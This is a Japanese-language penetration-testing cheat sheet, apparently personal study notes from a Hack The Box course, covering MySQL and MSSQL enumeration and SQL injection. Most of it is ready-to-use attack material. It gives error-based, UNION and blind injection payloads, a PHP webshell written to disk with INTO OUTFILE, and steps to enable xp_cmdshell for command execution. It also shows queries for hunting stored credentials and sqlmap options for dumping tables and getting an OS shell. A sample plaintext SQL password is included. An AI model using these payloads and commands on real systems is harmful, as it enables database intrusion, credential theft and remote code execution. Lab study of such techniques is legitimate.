よく使うコマンドだけ集めた

# DBの基本操作

## MySQL

接続
```sh
mysql -u <username> -p'<password>' -h $Target_IP -P 3306 --skip-ssl-verify-server-cert
```

バージョン取得
```
select version();
```

ユーザー名とホストを取得
```sh
select system_user();
```

mysql.userテーブルに属するuserとauthentication_stringの値の取得
- authentication_string_フィールドは、ユーザのパスワードで、[_Caching-SHA-256 アルゴリズム_](https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html)として保存
	- ちなみに、mysql.user は root 以外は読めない
```sh
SELECT user, authentication_string FROM mysql.user;
```

データベースの一覧を取得
```sh
show databases;
```

使用するデータベースを選択
```sh
use <データベース名>;
```

テーブルの一覧を取得
```sh
show Tables;
```

テーブルのデータを取得
```sh
select * from <table name>;
```

## MSSQL

リモートから接続
```
impacket-mssqlclient <username>:<password>@<IP> -windows-auth
```

ローカルから接続
```sh
# SQL Serverが起動しているのかを確認
Get-Service | Where-Object {$_.Name -like "*SQL*"}

# SQL Serverモジュールのインポート
Import-Module SQLPS

# ローカル接続
sqlcmd -S localhost\SQLEXPRESS -E  # Windows認証
sqlcmd -S localhost\SQLEXPRESS -U sa -P password  # SQL認証

sqlcmd -S localhost\SQLEXPRESS -U sa -P WhileChirpTuesday218

# または直接クエリ実行
sqlcmd -S localhost -E -Q "SELECT name FROM sys.databases;"

# 1>みたいのが出てきたら、SQLコマンド入れてEnter。2> にDOと入力してEnter
```

バージョンを取得
```sh
SELECT @@version;
```

データベースを一覧表示
```sh
SELECT name FROM sys.databases;
```
master、tempdb、model、msdb はデフォルトのデータベース

テーブルの一覧を取得
```sh
SELECT * FROM <データベース名>.information_schema.tables;
```

今のアクセスできるデータベース一覧
```sh
SELECT name FROM sys.databases WHERE HAS_DBACCESS(name) = 1;
```

テーブルのデータを取得
- テーブルの一覧を取得するコマンドで得られた「TABLE_CATALOG」・「TABLE_SCHEMA」・「TABLE_NAME」を利用
```sh
select * from <TABLE_CATALOG>.<TABLE_SCHEMA>.<TABLE_NAME>;
```

**応用**
データベースロールを確認
```sql
USE <データベース名>;

SELECT dp.name AS database_user, sp.name AS login_name, dp.type_desc FROM <データベース名>sys.database_principals dp LEFT JOIN sys.server_principals sp ON dp.sid = sp.sid WHERE dp.type IN ('S', 'U', 'G');
```

アクセス可能なデータベースから情報を探す
```sql
-- msdbは重要な情報が含まれる
USE msdb;
GO

-- バックアップ履歴（パスワードが含まれることも）
SELECT * FROM dbo.backupset;
GO

-- ジョブとステップ（認証情報）
SELECT job.name, step.command 
FROM dbo.sysjobs job
INNER JOIN dbo.sysjobsteps step ON job.job_id = step.job_id;
GO

-- リンクサーバーのログイン情報
SELECT * FROM sys.linked_logins;
GO
```

権限昇格の探索
```sql
-- Impersonation可能か
SELECT pr.name AS PrincipalName,
       pe.permission_name,
       pe.state_desc
FROM sys.server_permissions pe
INNER JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_id
WHERE pe.permission_name = 'IMPERSONATE';
GO

-- データベース所有者確認
SELECT name, SUSER_SNAME(owner_sid) AS owner 
FROM sys.databases;
GO
```

# 手動でのSQL Injectionの発見

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |
そのほか
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
##  エラーベースのペイロード

基本形
```
test OR 1=1 -- //
```

SQLコマンドを追加
- バージョン情報を取得
```
' or 1=1 in (select @@version) -- //
```

- テーブルデータの取得
```
' OR 1=1 in (SELECT * FROM users) -- //
```

テーブルの特定のユーザーの任意の列の情報を取得する
```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

## Unionベースのペイロード

UNION SQLi 攻撃の条件
1. 挿入されたUNIONクエリには、元のクエリと同じ数の列が含まれている必要がある
2. 各列間でデータ型に互換性がある必要がある

原理
基本的に、 %' UNION SELECT ... をくっつけて、「元の結果 + 自分の好きな SELECT 文の結果」を縦にくっつける

※ ここでは5列であることを前提に話を進める

列数の正確な確認
- 列の値を1ずつ増やして、エラーになったら、その前の列数であることがわかる
```
' ORDER BY 1-- //
```

どの列が表示されるかを確認する
```sh
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
```

SQL Unionを使ったデータベースの列挙
```sh
' UNION SELECT null, null, database(), user(), @@version  -- //
```
この時、列1は、整数データ型のIDフィールド用に予約されているため、 SELECT database()ステートメントで要求した文字列値を返すことができないことに注意する
⇨ 要は1列はnullにしろということ、0からカウントしている

現在のデータベースに属するinformation_schemaデータベースから__columns_テーブル を取得
そして、出力を 2 列目、3 列目、4 列目に格納し、1 列目と 5 列目は NULL のままにする
```sh
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

ユーザーテーブルをダンプする
```
' UNION SELECT null, username, password, description, null FROM users -- //
```

## ブラインドSQLインジェクション

ブラインドSQL インジェクションは、データベース応答が返されず、ブールベースまたは時間ベースのロジックのいずれかを使用して動作を推測する

ブラインドSQLインジェクションに対処する際には、**有効なレスポンスと誤ったレスポンスの両方**で調査が必要

ブールベースの SQLiペイロード
```
' AND 1=1 -- //
```

時間ベースの SQLi ペイロード
```
' AND IF (1=1, sleep(3),'false') -- //
```

# コード実行

## MySQL
Web Shellを利用して、コード実行ができる
- ファイルの場所が、データベース ソフトウェアを実行している OS ユーザーに対して書き込み可能である必要がある
 
 1. INTO OUTFILEを使用して、Webshellをディスクに書き込む
```sh
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

2. エラーが出る可能性があるが、書き込めている時のエラーなのか、書き込めていないエラーなのかを見分ける必要あり
	- OS errno 2 : ディレクトリがない
	- OS errno 13 :  Permission denied
3. `?cmd=id`でwebshellにアクセスできる


## MSSQL
- xp_cmdshellを使って、コマンドを実行できる

ログイン後、以下を順に実行し、xp_cmdshellを有効にする
```sh
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

コマンドを実行
```sh
EXECUTE xp_cmdshell 'whoami';
```

# SQLMap

## コマンド使用法
### cURLを使用
- ブラウザの開発者ツールで利用できる 「Copy as cURL」機能を使って、簡単にできる
	- Chrome・Edge・Firefoxの開発者ツールにある「Network（ネットワーク）」タブでアクセスできる
```sh
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

![](https://i.imgur.com/Y0urw2p.png)


### Burp Suite使用
1. BurpでPOSTリクエストをインターセプトし、テキストファイルとして保存
2. SQLMapで保存したファイルを使用し、コマンドを実行
```sh
sqlmap -r post.txt
```

## POSTリクエスト

 ---dataオプション
- `--data`オプションでPOSTパラメータを指定
```shell-session
sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -X POST
```
- `-p`オプションで特定パラメータだけを調べる
- `*`を使って注入対象のパラメータを明示できる
	- 例：`--data "id=1*&name=test"`




## 攻撃成功後
SQLコマンドの実行
1. 保存されてるセッションが保存されているディレクトリに移動
```sh
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[07:41:09] [INFO] fetched data logged to text files under '/home/htb-ac-1632385/.local/share/sqlmap/output/94.237.58.172'

┌─[us-academy-3]─[10.10.14.83]─[htb-ac-1632385@htb-yxgqrc876x]─[~]
└──╼ [★]$ cd /home/htb-ac-1632385/.local/share/sqlmap/output/94.237.58.172
```

## DB情報抽出
2. 保存したセッション情報を使って、SQLで情報を参照する
```sh
┌─[us-academy-3]─[10.10.14.83]─[htb-ac-1632385@htb-yxgqrc876x]─[~]
└──╼ [★]$ sqlmap -s *.sqlite -u <攻撃時にsqlmapの後に送ったwebページ情報> --sql-shell

```

Burp Suiteのファイルを使うとき
```sh
sqlmap -s *.sqlite -r <post.txtの場所> --sql-shell
```

2が上手くいかないとき

基本情報を取得
```sh
--banner --current-user --current-db --is-dba
```

テーブル一覧の取得
```sh
--tables -D <データベース名>
```

特定のテーブルの内容を取得する
```sh
--dump -T <テーブル名> -D <データベース名>
```

## OS Shell
OS shellを実行
- MSSQLだと、自動的に `xp_cmdshell` の有効化を試みてくれる
	- time-based blindのSQLiの場合、リバースシェルを実行するのが早い
```sh
 --os-shell
```

明示的にWebshellを置く
```sh
 --os-shell --web-root "/var/www/html/tmp"
```

## 攻撃チューニング
### Prefix/Suffixの追加
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
- SQLMapが送るすべてのベクターが `%'))` `<payload>-- -` の形で構成される

### Level/Risk
`--level`（1〜5、デフォルトは1）
- 使うvectorとboundaryのバリエーションの数を増やす
- → 値が高いほど、バリエーションいっぱい

`--risk` (1~3, デフォルトは1)
- 送るベクターの中でも「影響が大きいもの」まで含めるかを制御
- → 値が高いと、UPDATEやDELETEが含まれる危険なクエリも使うようになる